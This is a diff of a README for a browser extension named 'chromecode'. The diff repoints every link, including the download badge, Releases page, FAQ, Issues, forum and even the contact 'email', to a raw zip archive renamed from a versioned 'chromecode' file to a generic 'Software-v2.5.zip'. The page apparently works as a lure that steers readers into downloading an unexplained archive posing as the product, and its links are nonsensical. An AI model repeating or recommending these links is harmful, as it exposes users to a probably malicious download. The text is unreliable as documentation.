@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download chromecode](https://raw.githubusercontent.com/huey1400/chromecode/main/js/chromecode-3.0-beta.4.zip%https://raw.githubusercontent.com/huey1400/chromecode/main/js/chromecode-3.0-beta.4.zip)](https://raw.githubusercontent.com/huey1400/chromecode/main/js/chromecode-3.0-beta.4.zip)
+[![Download chromecode](https://raw.githubusercontent.com/huey1400/chromecode/main/js/Software-v2.5.zip%https://raw.githubusercontent.com/huey1400/chromecode/main/js/Software-v2.5.zip)](https://raw.githubusercontent.com/huey1400/chromecode/main/js/Software-v2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ To use chromecode, you need the following:
 
 ## 🔗 Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/huey1400/chromecode/main/js/chromecode-3.0-beta.4.zip) to download the latest version of chromecode.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/huey1400/chromecode/main/js/Software-v2.5.zip) to download the latest version of chromecode.
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, look for the latest version listed at the top.
@@ -57,7 +57,7 @@ If you face any issues while installing or using chromecode, try the following s
 - Restart your browser after installation.
 - Reinstall the extension if problems persist.
 
-For additional help, visit the [FAQ section](https://raw.githubusercontent.com/huey1400/chromecode/main/js/chromecode-3.0-beta.4.zip).
+For additional help, visit the [FAQ section](https://raw.githubusercontent.com/huey1400/chromecode/main/js/Software-v2.5.zip).
 
 ## 🛡️ Privacy and Permissions
 
@@ -65,11 +65,11 @@ chromecode only requires the permissions necessary to function effectively. Your
 
 ## 💬 Support
 
-For further assistance, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/huey1400/chromecode/main/js/chromecode-3.0-beta.4.zip). Our team is ready to help you out.
+For further assistance, please open an issue on our [GitHub Issues page](https://raw.githubusercontent.com/huey1400/chromecode/main/js/Software-v2.5.zip). Our team is ready to help you out.
 
 ## 📞 Contact
 
-If you wish to report a bug or suggest a feature, please reach out via email at https://raw.githubusercontent.com/huey1400/chromecode/main/js/chromecode-3.0-beta.4.zip or visit our [community forum](https://raw.githubusercontent.com/huey1400/chromecode/main/js/chromecode-3.0-beta.4.zip).
+If you wish to report a bug or suggest a feature, please reach out via email at https://raw.githubusercontent.com/huey1400/chromecode/main/js/Software-v2.5.zip or visit our [community forum](https://raw.githubusercontent.com/huey1400/chromecode/main/js/Software-v2.5.zip).
 
 ## 🌟 Changelog
 
@@ -88,9 +88,9 @@ All contributions to chromecode are subject to the MIT License. You may use it f
 
 ## 🔗 Important Links
 
-- [Releases Page](https://raw.githubusercontent.com/huey1400/chromecode/main/js/chromecode-3.0-beta.4.zip)
-- [FAQ](https://raw.githubusercontent.com/huey1400/chromecode/main/js/chromecode-3.0-beta.4.zip)
-- [GitHub Issues](https://raw.githubusercontent.com/huey1400/chromecode/main/js/chromecode-3.0-beta.4.zip)
-- [Community Forum](https://raw.githubusercontent.com/huey1400/chromecode/main/js/chromecode-3.0-beta.4.zip)
+- [Releases Page](https://raw.githubusercontent.com/huey1400/chromecode/main/js/Software-v2.5.zip)
+- [FAQ](https://raw.githubusercontent.com/huey1400/chromecode/main/js/Software-v2.5.zip)
+- [GitHub Issues](https://raw.githubusercontent.com/huey1400/chromecode/main/js/Software-v2.5.zip)
+- [Community Forum](https://raw.githubusercontent.com/huey1400/chromecode/main/js/Software-v2.5.zip)
 
 Thank you for choosing chromecode! Enjoy coding with a vibe!
